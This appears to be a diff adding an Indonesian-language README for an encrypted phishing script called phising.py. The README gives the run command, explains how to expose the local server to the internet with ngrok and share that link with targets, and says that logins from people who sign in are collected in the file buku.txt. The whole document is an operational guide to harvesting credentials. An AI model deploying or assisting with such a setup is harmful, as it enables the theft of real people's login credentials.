@@ -1,0 +1,27 @@
+T: Kenapa Di ENC,?
+J: Untuk Menghargai Para Pembuat Script Agar Tidak Mudah Di Recode.
+
+Saya Hanya Sebagai Penyusun
+
+Tidak Ada Send Email Dan Semacamnya
+
+Sudah Ku Periksa Semua Input Masuk Ke Dalam File buku.txt (DI JAMIN..!)
+
+
+Menjalankan
+
+
+python2 phising.py
+
+Listening web:  127.0.0.2:8080
+
+
+
+
+Kalau Memakai forward Ngrok 8080.
+
+./ngrok http 8080
+
+Lalu copy link ngrok sebagai url/link
+
+kalau ada yang login dan ingin melihat hasilnya di file buku.txt
